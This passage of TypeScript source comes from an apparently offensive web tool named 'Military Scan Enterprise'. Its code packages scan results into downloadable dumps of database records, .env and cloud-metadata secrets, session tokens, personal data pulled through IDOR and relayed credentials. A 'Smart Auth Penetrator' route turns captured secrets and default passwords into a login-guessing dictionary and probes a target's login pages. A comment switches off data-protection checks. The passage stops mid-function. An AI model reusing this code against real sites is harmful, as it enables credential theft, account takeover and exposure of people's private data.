  return [...new Set(found)];
}

function categorizeFindingsIntoDumps(findings: any[], target: string, scanId: string, enterpriseDossier?: any, probes?: any[]): DumpFile[] {
  const ts = new Date().toISOString().replace(/[:.]/g, "-").substring(0, 19);
  const newDumps: DumpFile[] = [];

  const ed = enterpriseDossier || {};
  const sessionTokens = ed.session_tokens || [];
  const deepCreds = ed.deep_credential_extractions || [];
  const idorSeqDumps = ed.idor_sequential_dumps || [];
  const adminExploitProbes = ed.admin_exploitation_probes || [];
  const sinfoDump = ed.sinfo_dump || {};
  const gitDump = ed.git_objects_dump || {};
  const dockerDump = ed.docker_full_dump || {};
  const imdsDump = ed.imdsv2_dump || {};
  const allProbes = probes || [];

  const vulnProbes = allProbes.filter((p: any) => p.vulnerable || /VULNERABLE|EXPLOITABLE|CONFIRMED|CRITICAL/i.test(p.verdict || ""));

  function buildRawRecord(f: any) {
    const record: any = {
      endpoint: f.endpoint || "",
      method: f.method || "GET",
      status_code: f.status_code || 0,
      severity: f.severity,
      title: f.title,
    };
    const rawResp = f.raw_response || f.evidence || "";
    if (rawResp) {
      try {
        record.response_body = JSON.parse(rawResp);
      } catch {
        record.response_body = rawResp;
      }
    }
    if (f.attack_payload) {
      try {
        record.attack_payload = JSON.parse(f.attack_payload);
      } catch {
        record.attack_payload = f.attack_payload;
      }
    }
    const extracted = extractRawSecrets(`${f.description || ""} ${f.evidence || ""} ${f.raw_response || ""}`);
    if (extracted.length > 0) {
      record.secrets_extracted = extracted;
    }
    return record;
  }

  function buildProbeRecord(p: any) {
    const record: any = {
      endpoint: p.endpoint || "",
      method: p.method || "GET",
      status_code: p.status_code || 0,
      verdict: p.verdict || "",
      probe_type: p.probe_type || "",
    };
    const snippet = p.response_snippet || p.response_body || p.raw_response || "";
    if (snippet) {
      try {
        record.response_body = JSON.parse(snippet);
      } catch {
        record.response_body = snippet;
      }
    }
    const attackPayload = p.payload || p.attack_payload || "";
    if (attackPayload) {
      try {
        record.payload_sent = JSON.parse(attackPayload);
      } catch {
        record.payload_sent = attackPayload;
      }
    }
    return record;
  }

  const dbFindings = findings.filter((f: any) =>
    /mongo|mysql|postgres|redis|database|db_|sql|stack trace|db leak/i.test(`${f.title} ${f.description} ${f.evidence || ""}`)
  );
  const dbProbes = vulnProbes.filter((p: any) =>
    /DB_REFLECTION|SQLi|SSRF_CREDENTIAL.*redis|SSRF_CREDENTIAL.*mongo|SSRF_CREDENTIAL.*postgres/i.test(`${p.probe_type} ${p.description || ""} ${p.verdict || ""}`)
  );
  if (dbFindings.length > 0 || dbProbes.length > 0) {
    const allRawSecrets: string[] = [];
    dbFindings.forEach((f: any) => allRawSecrets.push(...extractRawSecrets(`${f.description} ${f.evidence || ""} ${f.raw_response || ""}`)));
    dbProbes.forEach((p: any) => allRawSecrets.push(...extractRawSecrets(`${p.response_snippet || ""} ${p.evidence || ""}`)));
    const content = JSON.stringify({
      _header: { tool: "Military Scan Enterprise", type: "DATABASE_DUMP", target, timestamp: new Date().toISOString(), clearance: "ADMIN", protocol: "STANDARD", total_records: dbFindings.length + dbProbes.length },
      raw_credentials_extracted: [...new Set(allRawSecrets)],
      records: dbFindings.map((f: any) => buildRawRecord(f)),
      probe_captures: dbProbes.map((p: any) => buildProbeRecord(p)),
    }, null, 2);
    const filename = `DB-Dump-${ts}.json`;
    const size = writeDumpFile(filename, content);
    newDumps.push({ id: generateDumpId(), category: "database", filename, label: `Database Dump — ${dbFindings.length + dbProbes.length} records`, target, severity: dbFindings.some((f: any) => f.severity === "critical") ? "critical" : "high", itemCount: dbFindings.length + dbProbes.length, sizeBytes: size, createdAt: new Date().toISOString(), scanId });
  }

  const infraFindings = findings.filter((f: any) =>
    /env|secret|key|aws|firebase|docker|container|config|cloud|metadata|imds|credential.*extract/i.test(`${f.title} ${f.description}`)
  );
  const infraProbes = vulnProbes.filter((p: any) =>
    /SSRF|ENV|SECRET|IMDS|DOCKER|AWS/i.test(`${p.probe_type} ${p.description || ""}`)
  );
  if (infraFindings.length > 0 || infraProbes.length > 0 || Object.keys(sinfoDump).length > 0 || Object.keys(dockerDump).length > 0 || Object.keys(imdsDump).length > 0) {
    const allRawSecrets: string[] = [];
    infraFindings.forEach((f: any) => allRawSecrets.push(...extractRawSecrets(`${f.description} ${f.evidence || ""} ${f.raw_response || ""}`)));
    infraProbes.forEach((p: any) => allRawSecrets.push(...extractRawSecrets(`${p.response_snippet || ""} ${p.evidence || ""}`)));
    const sectionLines: string[] = [];
    sectionLines.push(`═══════════════════════════════════════════════════════`);
    sectionLines.push(`  MSE — INFRA SECRETS DUMP [STANDARD]`);
    sectionLines.push(`  TARGET: ${target}`);
    sectionLines.push(`  TIMESTAMP: ${new Date().toISOString()}`);
    sectionLines.push(`  PROTOCOL: STANDARD  MASKING APPLIED WHEN REQUIRED`);
    sectionLines.push(`  TOTAL VECTORS: ${infraFindings.length + infraProbes.length}`);
    sectionLines.push(`═══════════════════════════════════════════════════════\n`);

    if (sinfoDump.secrets && sinfoDump.secrets.length > 0) {
      sectionLines.push(`── .ENV SECRETS (${sinfoDump.secrets.length} extracted) ──`);
      for (const s of sinfoDump.secrets) {
        sectionLines.push(`  ${s.key}=${s.raw_value || s.value || `[${s.value_length} chars]`}`);
      }
      sectionLines.push('');
    }

    if ([...new Set(allRawSecrets)].length > 0) {
      sectionLines.push(`── EXTRACTED RAW SECRETS ──`);
      [...new Set(allRawSecrets)].forEach(s => sectionLines.push(`  ${s}`));
      sectionLines.push('');
    }

    infraFindings.forEach((f: any) => {
      sectionLines.push(`── [${(f.severity || "info").toUpperCase()}] ${f.title} ──`);
      if (f.endpoint) sectionLines.push(`  ENDPOINT: ${f.endpoint}`);
      if (f.status_code) sectionLines.push(`  HTTP STATUS: ${f.status_code}`);
      const rawResp = f.raw_response || f.evidence || "";
      if (rawResp) {
        sectionLines.push(`  RAW RESPONSE BODY:`);
        rawResp.split('\n').forEach((line: string) => sectionLines.push(`    ${line}`));
      }
      if (f.attack_payload) sectionLines.push(`  PAYLOAD: ${f.attack_payload}`);
      sectionLines.push('');
    });

    infraProbes.forEach((p: any) => {
      sectionLines.push(`── [PROBE] ${p.probe_type}: ${p.endpoint || ""} ──`);
      sectionLines.push(`  METHOD: ${p.method || "GET"} | STATUS: ${p.status_code || 0}`);
      sectionLines.push(`  VERDICT: ${p.verdict || ""}`);
      const snippet = p.response_snippet || p.response_body || "";
      if (snippet) {
        sectionLines.push(`  RAW RESPONSE BODY:`);
        snippet.split('\n').forEach((line: string) => sectionLines.push(`    ${line}`));
      }
      if (p.payload) sectionLines.push(`  PAYLOAD: ${p.payload}`);
      sectionLines.push('');
    });

    if (dockerDump.data && dockerDump.data.length > 0) {
      sectionLines.push(`── DOCKER ENV DUMP (${dockerDump.endpoints_dumped} endpoints) ──`);
      for (const d of dockerDump.data) {
        sectionLines.push(`  [${d.label}] ${d.data_preview || d.raw_content || `${d.response_size} bytes`}`);
      }
      sectionLines.push('');
    }

    if (imdsDump.data && imdsDump.data.length > 0) {
      sectionLines.push(`── AWS IMDS DUMP (IMDSv2 bypass: ${imdsDump.token_acquired}) ──`);
      for (const im of imdsDump.data) {
        sectionLines.push(`  ${im.path} → ${im.raw_content || im.type || "metadata"} (${im.size} bytes)`);
      }
      sectionLines.push('');
    }

    if (deepCreds.length > 0) {
      sectionLines.push(`── DEEP CREDENTIAL EXTRACTIONS (${deepCreds.length} vectors) ──`);
      for (const dc of deepCreds) {
        sectionLines.push(`  [${dc.type}] ${dc.source}`);
        if (dc.credentials) {
          for (const c of dc.credentials) {
            sectionLines.push(`    ${c.key}=${c.raw_value || c.value || `[${c.value_length} chars]`}`);
          }
        }
        if (dc.raw_content) {
          sectionLines.push(`  RAW:`);
          dc.raw_content.split('\n').forEach((line: string) => sectionLines.push(`    ${line}`));
        }
      }
      sectionLines.push('');
    }

    const content = sectionLines.join("\n");
    const filename = `Infra-Secrets-${ts}.txt`;
    const size = writeDumpFile(filename, content);
    const totalItems = infraFindings.length + infraProbes.length + (sinfoDump.secrets_extracted || 0) + (dockerDump.endpoints_dumped || 0) + (imdsDump.data?.length || 0) + deepCreds.length;
    newDumps.push({ id: generateDumpId(), category: "infra_secrets", filename, label: `Infra Secrets — ${totalItems} keys`, target, severity: "critical", itemCount: totalItems, sizeBytes: size, createdAt: new Date().toISOString(), scanId });
  }

  const configFindings = findings.filter((f: any) =>
    /\.env|web\.config|source map|config\.php|wp-config|config\.yml|auth bypass.*file/i.test(`${f.title} ${f.description}`)
  );
  if (configFindings.length > 0) {
    const configRecords = configFindings.map((f: any) => {
      const record: any = {
        url: f.endpoint || `${target}${/\/\.\w+/i.test(f.title) ? f.title.match(/\/\.\w+[\w.]*/)?.[0] || "" : ""}`,
        severity: f.severity,
        file_type: /\.env/i.test(f.title) ? ".env" : /wp-config/i.test(f.title) ? "wp-config.php" : /source map/i.test(f.title) ? ".js.map" : "config",
      };
      const rawResp = f.raw_response || f.evidence || "";
      if (rawResp) {
        try {
          record.raw_content = JSON.parse(rawResp);
        } catch {
          record.raw_content = rawResp;
        }
      }
      const extracted = extractRawSecrets(`${f.description || ""} ${f.evidence || ""} ${f.raw_response || ""}`);
      if (extracted.length > 0) {
        record.secrets_found = extracted;
        record.parsed_variables = {};
        extracted.forEach(s => {
          const match = s.match(/^([A-Z_][A-Z0-9_]*)[\s]*[=:]\s*(.+)$/);
          if (match) record.parsed_variables[match[1]] = match[2];
        });
      }
      return record;
    });

    const content = JSON.stringify({
      _header: { tool: "Military Scan Enterprise", type: "CONFIG_FILES_DUMP", target, timestamp: new Date().toISOString(), protocol: "STANDARD", total_files: configFindings.length },
      git_repository: gitDump.git_exposed ? {
        branch: "main",
        objects_recovered: gitDump.objects_recovered,
        objects: (gitDump.objects || []).map((o: any) => ({
          path: o.path,
          size: o.size,
          raw_content: o.content_preview || o.raw_content || "",
        })),
      } : null,
      files: configRecords,
    }, null, 2);
    const filename = `Config-Files-${ts}.json`;
    const size = writeDumpFile(filename, content);
    newDumps.push({ id: generateDumpId(), category: "config_files", filename, label: `Config Files — ${configFindings.length} exposed`, target, severity: "critical", itemCount: configFindings.length, sizeBytes: size, createdAt: new Date().toISOString(), scanId });
  }

  const sessionFindings = findings.filter((f: any) =>
    /cookie|session.*token|jwt.*captur|session.*captur|cookie.*hijack/i.test(`${f.title} ${f.description}`)
  );
  const sessionProbes = vulnProbes.filter((p: any) =>
    /SESSION|COOKIE|JWT|TOKEN/i.test(`${p.probe_type} ${p.description || ""}`)
  );
  if (sessionFindings.length > 0 || sessionTokens.length > 0 || sessionProbes.length > 0) {
    const content = JSON.stringify({
      _header: { tool: "Military Scan Enterprise", type: "SESSION_TOKEN_DUMP", target, timestamp: new Date().toISOString(), protocol: "STANDARD", total_tokens: sessionTokens.length + sessionFindings.length },
      captured_tokens: sessionTokens.map((t: any) => ({
        type: t.type,
        name: t.name,
        value: t.raw_value || t.value || `[${t.value_length} chars]`,
        domain: t.domain || target.replace(/https?:\/\//, ""),
        path: t.path || "/",
        secure: t.secure,
        httponly: t.httponly,
        samesite: t.samesite || "none",
        source: t.source,
      })),
      findings: sessionFindings.map((f: any) => {
        const record = buildRawRecord(f);
        const cookieMatches = (f.description || "").match(/\b([a-zA-Z_][a-zA-Z0-9_-]*)\s*(?:cookie|flag)/gi) || [];
        if (cookieMatches.length > 0) record.cookies_referenced = cookieMatches;
        return record;
      }),
      probe_captures: sessionProbes.map((p: any) => buildProbeRecord(p)),
    }, null, 2);
    const filename = `Session-Tokens-${ts}.json`;
    const size = writeDumpFile(filename, content);
    const totalTokens = sessionFindings.length + sessionTokens.length + sessionProbes.length;
    newDumps.push({ id: generateDumpId(), category: "session_tokens", filename, label: `Session Tokens — ${totalTokens} captured`, target, severity: "critical", itemCount: totalTokens, sizeBytes: size, createdAt: new Date().toISOString(), scanId });
  }

  const idorFindings = findings.filter((f: any) =>
    /idor|sequential.*fetch|direct.*object|user.*record.*enum|enumerat.*endpoint/i.test(`${f.title} ${f.description}`)
  );
  const idorProbes = vulnProbes.filter((p: any) =>
    /IDOR|SEQUENTIAL|USER_ENUM/i.test(`${p.probe_type}`)
  );
  if (idorFindings.length > 0 || idorSeqDumps.length > 0 || idorProbes.length > 0) {
    const content = JSON.stringify({
      _header: { tool: "Military Scan Enterprise", type: "IDOR_SEQUENTIAL_DUMP", target, timestamp: new Date().toISOString(), classification: "GDPR / LGPD / PCI-DSS", protocol: "STANDARD", total_endpoints: idorFindings.length + idorProbes.length },
      sequential_dumps: idorSeqDumps,
      endpoints: idorFindings.map((f: any) => {
        const record = buildRawRecord(f);
        record.data_type = /user/i.test(f.title) ? "PII" : /order/i.test(f.title) ? "FINANCIAL" : /invoice/i.test(f.title) ? "FINANCIAL" : "MIXED";
        return record;
      }),
      probe_captures: idorProbes.map((p: any) => buildProbeRecord(p)),
    }, null, 2);
    const filename = `IDOR-Dump-${ts}.json`;
    const size = writeDumpFile(filename, content);
    newDumps.push({ id: generateDumpId(), category: "idor_dumps", filename, label: `IDOR Sequential — ${idorFindings.length + idorSeqDumps.length + idorProbes.length} vectors`, target, severity: "critical", itemCount: idorFindings.length + idorSeqDumps.length + idorProbes.length, sizeBytes: size, createdAt: new Date().toISOString(), scanId });
  }

  const credRelayFindings = findings.filter((f: any) =>
    /credential.relay|CREDENTIAL RELAY|HRD CREDENTIAL RELAY/i.test(`${f.title} ${f.category || ""}`)
  );
  if (credRelayFindings.length > 0) {
    const allRelaySecrets: string[] = [];
    const allCategories: string[] = [];
    credRelayFindings.forEach((f: any) => {
      if (f.secrets_extracted && Array.isArray(f.secrets_extracted)) {
        allRelaySecrets.push(...f.secrets_extracted);
      }
      allRelaySecrets.push(...extractRawSecrets(`${f.description || ""} ${f.evidence || ""} ${f.raw_response || ""}`));
      try {
        const rc = typeof f.raw_content === "string" ? JSON.parse(f.raw_content) : f.raw_content;
        if (rc && rc.categories) allCategories.push(...rc.categories);
      } catch {}
    });
    const uniqueSecrets = [...new Set(allRelaySecrets)];
    const uniqueCategories = [...new Set(allCategories)];
    const content = JSON.stringify({
      _header: { tool: "Military Scan Enterprise", type: "CREDENTIAL_RELAY_DUMP", target, timestamp: new Date().toISOString(), classification: "TOTAL COMPROMISE", protocol: "STANDARD", total_credentials: uniqueSecrets.length, relay_sources: credRelayFindings.length },
      credential_categories: uniqueCategories,
      captured_credentials: uniqueSecrets.map(s => {
        const parts = s.match(/^([^=]+)=(.+)$/);
        return parts ? { key: parts[1], value: parts[2] } : { key: "raw", value: s };
      }),
      relay_findings: credRelayFindings.map((f: any) => ({
        title: f.title,
        module: f.module || f.phase || "",
        severity: f.severity,
        raw_value: f.raw_value || "",
        secrets_extracted: f.secrets_extracted || [],
        raw_content: f.raw_content || "",
      })),
      session_tokens: sessionTokens.map((t: any) => ({
        type: t.type,
        name: t.name,
        value: t.raw_value || t.value || `[${t.value_length} chars]`,
        source: t.source,
      })),
    }, null, 2);
    const filename = `Credential-Relay-${ts}.json`;
    const size = writeDumpFile(filename, content);
    newDumps.push({ id: generateDumpId(), category: "credential_relay", filename, label: `Credential Relay — ${uniqueSecrets.length} credentials (JWT/Session/Admin)`, target, severity: "critical", itemCount: uniqueSecrets.length, sizeBytes: size, createdAt: new Date().toISOString(), scanId });
  }

  const adminFindings = findings.filter((f: any) =>
    /admin.*privilege|admin.*exploit|price.*manipulat|coupon.*forg|privilege.*escalat|write.*confirm/i.test(`${f.title} ${f.description}`)
  );
  const adminProbes = vulnProbes.filter((p: any) =>
    /ADMIN|PRIVILEGE|PRICE|COUPON|ESCALAT/i.test(`${p.probe_type} ${p.description || ""}`)
  );
  if (adminFindings.length > 0 || adminExploitProbes.length > 0 || adminProbes.length > 0) {
    const content = JSON.stringify({
      _header: { tool: "Military Scan Enterprise", type: "ADMIN_EXPLOITATION_DUMP", target, timestamp: new Date().toISOString(), classification: "TOTAL COMPROMISE", protocol: "STANDARD", total_exploits: adminFindings.length + adminProbes.length },
      exploitation_probes: adminExploitProbes,
      exploits: adminFindings.map((f: any) => {
        const record = buildRawRecord(f);
        record.exploit_type = /price/i.test(f.title) ? "PRICE_OVERRIDE" : /coupon/i.test(f.title) ? "COUPON_FORGERY" : "PRIVILEGE_ESCALATION";
        return record;
      }),
      probe_captures: adminProbes.map((p: any) => buildProbeRecord(p)),
    }, null, 2);
    const filename = `Admin-Exploit-${ts}.json`;
    const size = writeDumpFile(filename, content);
    newDumps.push({ id: generateDumpId(), category: "admin_exploits", filename, label: `Admin Exploitation — ${adminFindings.length + adminExploitProbes.length + adminProbes.length} probes`, target, severity: "critical", itemCount: adminFindings.length + adminExploitProbes.length + adminProbes.length, sizeBytes: size, createdAt: new Date().toISOString(), scanId });
  }

  return newDumps;
}

adminRouter.get("/api/admin/dumps", requireAdmin, async (_req: Request, res: Response) => {
  res.json({ dumps: dumpRegistry, total: dumpRegistry.length });
});

adminRouter.get("/api/admin/dumps/scans", requireAdmin, async (_req: Request, res: Response) => {
  try {
    const allScans = await storage.getAllScans(200);
    const completedScans = allScans.filter(s => s.status === "completed" && s.findingsCount > 0);
    const scanSummaries = completedScans.map(s => {
      const findings = (s.findings as any[]) || [];
      const assets = (s.exposedAssets as any[]) || [];

      const dbFindings = findings.filter((f: any) =>
        /mongo|mysql|postgres|redis|database|db_|sql|stack trace|db leak/i.test(`${f.title} ${f.description}`)
      );
      const infraFindings = findings.filter((f: any) =>
        /env|secret|key|aws|firebase|docker|container|config|cloud|metadata|imds|credential.*extract/i.test(`${f.title} ${f.description}`)
      );
      const sessionFindings = findings.filter((f: any) =>
        /cookie|session.*token|jwt.*captur|session.*captur|cookie.*hijack/i.test(`${f.title} ${f.description}`)
      );
      const idorFindings = findings.filter((f: any) =>
        /idor|sequential.*fetch|direct.*object|user.*record.*enum|enumerat.*endpoint/i.test(`${f.title} ${f.description}`)
      );
      const adminFindings = findings.filter((f: any) =>
        /admin.*privilege|admin.*exploit|price.*manipulat|coupon.*forg|privilege.*escalat|write.*confirm/i.test(`${f.title} ${f.description}`)
      );
      const configFindings = findings.filter((f: any) =>
        /\.env|web\.config|source map|config\.php|wp-config|config\.yml|auth bypass.*file/i.test(`${f.title} ${f.description}`)
      );
      const credRelayFindings = findings.filter((f: any) =>
        /credential.relay|CREDENTIAL RELAY|HRD CREDENTIAL RELAY/i.test(`${f.title} ${(f as any).category || ""}`)
      );

      return {
        id: s.id,
        target: s.target,
        status: s.status,
        findingsCount: s.findingsCount,
        criticalCount: s.criticalCount,
        highCount: s.highCount,
        mediumCount: s.mediumCount,
        lowCount: s.lowCount,
        infoCount: s.infoCount,
        completedAt: s.completedAt,
        createdAt: s.createdAt,
        findings,
        exposedAssets: assets,
        extraction_summary: {
          database: dbFindings.length,
          infra_secrets: infraFindings.length,
          session_tokens: sessionFindings.length,
          config_files: configFindings.length,
          idor_dumps: idorFindings.length,
          admin_exploits: adminFindings.length,
          credential_relay: credRelayFindings.length,
          total: dbFindings.length + infraFindings.length + sessionFindings.length + configFindings.length + idorFindings.length + adminFindings.length + credRelayFindings.length,
        },
        hasDumpFiles: dumpRegistry.some(d => d.scanId === s.id),
      };
    });

    return res.json({ scans: scanSummaries, total: scanSummaries.length });
  } catch (err: any) {
    return res.status(500).json({ error: "Failed to fetch scan dumps: " + err.message });
  }
});

adminRouter.post("/api/admin/dumps/generate", requireAdmin, async (req: Request, res: Response) => {
  const { scanId } = req.body;
  if (!scanId) return res.status(400).json({ error: "scanId required" });

  try {
    const scan = await storage.getScan(scanId);
    if (!scan) return res.status(404).json({ error: "Scan not found" });
    if (scan.status !== "completed") return res.status(400).json({ error: "Scan not completed" });

    const findings = (scan.findings as any[]) || [];
    const scanProbes = (scan as any).probes || (scan.exposedAssets as any[])?.filter((a: any) => a.probe_type) || [];
    const newDumps = categorizeFindingsIntoDumps(findings, scan.target, scanId, undefined, scanProbes);

    for (const dump of newDumps) {
      dumpRegistry.unshift(dump);
    }

    if (dumpRegistry.length > 100) dumpRegistry.splice(100);

    log(`[dumps] Generated ${newDumps.length} dump files for scan ${scanId.substring(0, 8)}`, "admin");
    res.json({ generated: newDumps.length, dumps: newDumps });
  } catch (err: any) {
    res.status(500).json({ error: `Dump generation failed: ${err.message}` });
  }
});

adminRouter.post("/api/admin/dumps/generate-from-data", requireAdmin, async (req: Request, res: Response) => {
  const { findings, target, scanId, enterpriseDossier, probes: reqProbes } = req.body;
  if (!findings || !target) return res.status(400).json({ error: "findings and target required" });

  try {
    const newDumps = categorizeFindingsIntoDumps(findings, target, scanId || "manual", enterpriseDossier, reqProbes || []);
    for (const dump of newDumps) {
      dumpRegistry.unshift(dump);
    }
    if (dumpRegistry.length > 100) dumpRegistry.splice(100);

    log(`[dumps] Generated ${newDumps.length} dump files from live data for ${target}`, "admin");
    res.json({ generated: newDumps.length, dumps: newDumps });
  } catch (err: any) {
    res.status(500).json({ error: `Dump generation failed: ${err.message}` });
  }
});

adminRouter.get("/api/admin/dumps/download/:filename", requireAdmin, async (req: Request, res: Response) => {
  const { filename } = req.params;
  const sanitized = path.basename(filename);
  const filePath = path.join(DUMPS_DIR, sanitized);

  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: "Dump file not found" });
  }

  const ext = path.extname(sanitized).toLowerCase();
  const mimeTypes: Record<string, string> = {
    ".json": "application/json",
    ".txt": "text/plain",
    ".csv": "text/csv",
  };

  res.setHeader("Content-Type", mimeTypes[ext] || "application/octet-stream");
  res.setHeader("Content-Disposition", `attachment; filename="${sanitized}"`);
  fs.createReadStream(filePath).pipe(res);
});

adminRouter.delete("/api/admin/dumps/:dumpId", requireAdmin, async (req: Request, res: Response) => {
  const { dumpId } = req.params;
  const idx = dumpRegistry.findIndex(d => d.id === dumpId);
  if (idx === -1) return res.status(404).json({ error: "Dump not found" });

  const dump = dumpRegistry[idx];
  const filePath = path.join(DUMPS_DIR, dump.filename);
  if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
  dumpRegistry.splice(idx, 1);

  res.json({ deleted: true });
});

adminRouter.post("/api/admin/dumps/live-feed-link", requireAdmin, async (req: Request, res: Response) => {
  const { target, secrets } = req.body;
  if (!target || !secrets || !Array.isArray(secrets)) {
    return res.status(400).json({ error: "target and secrets[] required" });
  }
  const existing = liveFeedSecretsStore.get(target) || [];
  const merged = [...new Set([...existing, ...secrets])];
  liveFeedSecretsStore.set(target, merged);

  for (const dump of dumpRegistry) {
    if (dump.target === target && (dump.category === "infra_secrets" || dump.category === "config_files")) {
      dump.hasLiveFeedSecrets = true;
      dump.liveFeedKeys = merged.slice(0, 20);
    }
  }

  log(`[LIVE-FEED] Linked ${secrets.length} secrets to target ${target} → ${dumpRegistry.filter(d => d.target === target).length} dumps tagged`, "admin");
  res.json({ linked: secrets.length, totalForTarget: merged.length });
});

adminRouter.get("/api/admin/dumps/live-feed-status/:target", requireAdmin, async (req: Request, res: Response) => {
  const target = decodeURIComponent(req.params.target);
  const secrets = liveFeedSecretsStore.get(target) || [];
  res.json({ target, hasLiveFeed: secrets.length > 0, secretCount: secrets.length, keys: secrets.map(s => s.split("=")[0]) });
});

adminRouter.get("/api/admin/dumps/extraction-data/:scanId", requireAdmin, async (req: Request, res: Response) => {
  const { scanId } = req.params;
  try {
    const scan = await storage.getScan(parseInt(scanId));
    if (!scan) return res.status(404).json({ error: "Scan not found" });
    const findings = (scan.findings as any[]) || [];

    const envSecrets = findings.filter((f: any) => /\.env|secret|key|aws|firebase|api_key|encryption|credential/i.test(`${f.title} ${f.description}`));
    const infraDumps = findings.filter((f: any) => /docker|container|ssrf|redis|internal.*service|imds|metadata/i.test(`${f.title} ${f.description}`));
    const sessionData = findings.filter((f: any) => /cookie|session|jwt|token|auth/i.test(`${f.title} ${f.description}`));
    const dbLeaks = findings.filter((f: any) => /database|postgres|mysql|mongo|sql|stack.*trace|db.leak/i.test(`${f.title} ${f.description}`));

    const rawEnvContent = envSecrets.map((f: any) => {
      const desc = f.description || "";
      const matches = desc.match(/[A-Z_]{2,}=[^\s]+/g) || [];
      return matches.length > 0 ? matches.join("\n") : `# ${f.title}\n${desc}`;
    }).join("\n\n");

    const rawInfraContent = infraDumps.map((f: any) => `[${(f.severity || "info").toUpperCase()}] ${f.title}\n${f.description || ""}`).join("\n---\n");

    const targetSecrets = liveFeedSecretsStore.get(scan.target) || [];

    res.json({
      scanId,
      target: scan.target,
      envSecrets: { count: envSecrets.length, raw: rawEnvContent, findings: envSecrets },
      infraDumps: { count: infraDumps.length, raw: rawInfraContent, findings: infraDumps },
      sessionData: { count: sessionData.length, findings: sessionData },
      dbLeaks: { count: dbLeaks.length, findings: dbLeaks },
      liveFeedSecrets: targetSecrets,
      hasLiveFeed: targetSecrets.length > 0,
    });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

adminRouter.post("/api/admin/combinator/smart-auth", async (req: Request, res: Response) => {
  const { target, minedData } = req.body;
  if (!target) return res.status(400).json({ error: "Target URL required" });

  const validation = validateSniperTarget(target);
  if (!validation.valid) return res.status(403).json({ error: validation.error });

  const timestamp = formatTimestamp();
  const userId = (req.session as any)?.userId;
  log(`[COMBINATOR] Smart Auth Penetrator → ${target}`, "admin");

  try {
    const url = validation.url;
    const baseUrl = url.replace(/\/$/, "");

    const infraSecrets: string[] = minedData?.infraSecrets || credentialRelay.infraSecrets;
    const dbCredentials: string[] = minedData?.dbCredentials || credentialRelay.dbCredentials;
    const sessionTokens: string[] = minedData?.sessionTokens || credentialRelay.sessionTokens;
    const discoveredUsers: string[] = minedData?.discoveredUsers || credentialRelay.discoveredUsers;
    type RelayCredential = { value: string; type?: string; confidence?: number; source?: string };
    const rawCredentials: RelayCredential[] = [];
    if (Array.isArray(minedData?.credentials)) {
      for (const c of minedData.credentials) {
        if (typeof c === "string") rawCredentials.push({ value: c });
        else if (c?.value) rawCredentials.push({ value: c.value, type: c.type, confidence: (c as any).confidence, source: (c as any).source });
      }
    }
    for (const c of credentialRelay.credentials) {
      rawCredentials.push({ value: (c as any).value || (c as any).key || "", type: (c as any).type, source: (c as any).source });
    }
    // LGPD OFF (test mode): aceitar qualquer credencial capturada
    const isRealCredential = (_cred: RelayCredential) => true;
    const realCredentials = rawCredentials.filter(isRealCredential);
    // Sem requisito de quantidade mínima durante testes

    let dumpsGenerated = 0;
    let lastDumpAt = 0;
    const MAX_DUMPS = 20;
    const MIN_DUMP_GAP_MS = 2000;
    const allowDump = async (label: string) => {
      if (dumpsGenerated >= MAX_DUMPS) {
        log(`[COMBINATOR] Dump ignorado (${label})  limite de ${MAX_DUMPS} por scan`, "admin");
        return false;
      }
      const now = Date.now();
      const wait = MIN_DUMP_GAP_MS - (now - lastDumpAt);
      if (wait > 0) {
        await new Promise((resolve) => setTimeout(resolve, wait));
      }
      lastDumpAt = Date.now();
      dumpsGenerated += 1;
      return true;
    };

    if (!minedData && credentialRelay.credentials.length > 0) {
      log(`[DATABRIDGE] Auto-loaded ${credentialRelay.credentials.length} credentials from relay for Combinator`, "admin");
    }

    const contextualDict: string[] = [];

    for (const secret of infraSecrets) {
      contextualDict.push(secret);
      if (secret.length > 6) {
        contextualDict.push(secret.substring(0, 8));
        contextualDict.push(secret.toUpperCase());
        contextualDict.push(secret + "123");
        contextualDict.push(secret + "!");
        contextualDict.push(secret.split("").reverse().join(""));
      }
    }

    for (const cred of dbCredentials) {
      contextualDict.push(cred);
      contextualDict.push(cred + "@admin");
      contextualDict.push(cred + "#2024");
    }

    contextualDict.push("admin", "password", "admin123", "root", "toor", "P@ssw0rd");

    const uniqueDict = [...new Set(contextualDict)].slice(0, 50);

    const loginEndpoints = [
      "/admin", "/login", "/api/auth/login", "/api/login", "/admin/login",
      "/wp-login.php", "/api/v1/auth", "/auth/signin", "/api/sessions",
    ];

    const phases: any[] = [];

    const phase1: any = {
      phase: "PHASE_1_ENDPOINT_DISCOVERY",
      label: "Login Endpoint Discovery",
      endpoints: [],
      startedAt: Date.now(),
    };

    for (const ep of loginEndpoints) {
      try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 4000);
        const resp = await fetch(`${baseUrl}${ep}`, {
          method: "GET",
          headers: { "User-Agent": "MSE-Combinator/2.0" },
          signal: controller.signal,
          redirect: "manual",
        });
        clearTimeout(timeout);
        const status = resp.status;
        const hasForm = status === 200;
        const redirectsToLogin = (status === 301 || status === 302);
        phase1.endpoints.push({
          path: ep,
          status,
          hasLoginForm: hasForm,
          redirectsToLogin,
          verdict: hasForm ? "FORM_DETECTED" : redirectsToLogin ? "REDIRECT" : status === 403 ? "WAF_BLOCKED" : "NOT_FOUND",
        });
      } catch (err: any) {
        phase1.endpoints.push({ path: ep, status: 0, verdict: "TIMEOUT", error: err.message?.substring(0, 80) });
      }
    }
    phase1.completedAt = Date.now();
    phase1.formsFound = phase1.endpoints.filter((e: any) => e.hasLoginForm).length;
    phase1.wafBlocked = phase1.endpoints.filter((e: any) => e.verdict === "WAF_BLOCKED").length;
    phases.push(phase1);

    const phase2: any = {
      phase: "PHASE_2_CONTEXTUAL_DICTIONARY",
      label: "Contextual Dictionary Generation",
      infraSecretsIngested: infraSecrets.length,
      dbCredentialsIngested: dbCredentials.length,
      sessionTokensIngested: sessionTokens.length,
      discoveredUsersIngested: discoveredUsers.length,
      totalVariations: uniqueDict.length,
      dictionaryPreview: uniqueDict.slice(0, 10),
      generationMethod: infraSecrets.length > 0 ? "CONTEXTUAL_MINING" : "FALLBACK_GENERIC",
    };
    phases.push(phase2);

    const phase3: any = {
      phase: "PHASE_3_CREDENTIAL_ROTATION",
      label: "Smart Credential Rotation",
      attempts: [],
      startedAt: Date.now(),
    };

    const activeLoginEndpoints = phase1.endpoints
      .filter((e: any) => e.hasLoginForm || e.redirectsToLogin)
      .map((e: any) => e.path);

